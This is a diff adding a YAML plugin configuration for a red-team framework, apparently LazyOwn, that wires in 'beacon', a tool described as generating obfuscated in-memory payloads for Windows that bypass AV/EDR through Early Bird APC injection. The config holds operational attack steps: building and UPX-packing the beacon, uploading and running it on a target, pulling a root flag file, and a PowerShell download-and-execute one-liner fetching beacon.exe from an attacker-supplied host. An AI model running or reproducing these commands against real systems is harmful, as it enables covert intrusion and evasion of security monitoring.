@@ -1,0 +1,21 @@
+name: beacon
+description: >
+  beacon is a next-generation, automated framework for generating, obfuscating, and delivering beacon in pure C to windows machines. Designed for red team operations, penetration testing, and offensive research, beacon empowers attackers to deploy stealthy, payloads that execute directly in memory — bypassing traditional AV/EDR detection mechanisms using Early Bird APC Injection and NT Native API Calls.
+author: "LazyOwn RedTeam"
+version: "1.0"
+enabled: true
+params:
+  - name: lhost
+    type: string
+    required: true
+    description: lhost target.
+tool:
+  name: beacon
+  repo_url: https://github.com/grisuno/beacon.git
+  install_path: external/.exploit/beacon
+  install_command: make windows
+  execute_command: chmod +x *.sh && ./gen_beacon.sh && upx beacon.exe
+  upload_file: no_priv ./external/.exploit/beacon/beacon.exe
+  remote_command: no_priv .\beacon.exe
+  download_file: C:\Users\Administrator\Desktop\root.txt
+  lazycommand: encodewinbase64 powershell -c \"Invoke-WebRequest 'http://{lhost}/beacon.exe' -OutFile 'beacon.exe'; Start-Process 'beacon.exe'\"
